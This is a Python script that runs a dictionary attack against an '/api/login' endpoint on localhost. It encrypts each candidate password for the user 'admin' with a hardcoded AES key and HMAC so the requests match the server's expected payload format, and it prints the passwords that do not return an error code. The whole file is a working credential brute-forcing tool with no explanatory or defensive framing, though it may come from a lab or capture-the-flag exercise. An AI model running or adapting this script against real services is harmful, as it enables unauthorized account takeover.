import base64
import json
import os
import hashlib
import hmac

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


BASE_URL = "http://localhost:9501"
DICT_PATH = "dict.txt"

def load_key(base64_key: str) -> bytes:
    return base64.b64decode(base64_key)


def aes_encrypt(data: dict, key: bytes):

    plaintext = json.dumps(data).encode("utf-8")

    iv = os.urandom(16)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    iv_b64 = base64.b64encode(iv).decode()
    ct_b64 = base64.b64encode(ciphertext).decode()

    mac_hex = hmac.new(
        key,
        (iv_b64 + ct_b64).encode(),
        hashlib.sha256
    ).hexdigest()

    payload = json.dumps({
        "iv": iv_b64,
        "value": ct_b64,
        "mac": mac_hex
    })

    return base64.b64encode(payload.encode()).decode()


def encrypt_payload(username, password, base64_key):
    key = load_key(base64_key)
    return aes_encrypt({"username": username, "password": password}, key)


if __name__ == "__main__":
    AES_KEY_BASE64 = "Yle1msnwyuUb8+JZDai6Ww=="

    with open(DICT_PATH, 'rb') as f:
        for line in f:
            pwd = line.strip().decode(errors="ignore")
            encrypted = encrypt_payload("admin", pwd, AES_KEY_BASE64)
            # print(encrypted)
            r = requests.post(url=BASE_URL+'/api/login',data={'data':encrypted})
            # print(r.text)
            code = r.json()['code']
            if code != 400:
                print(pwd)
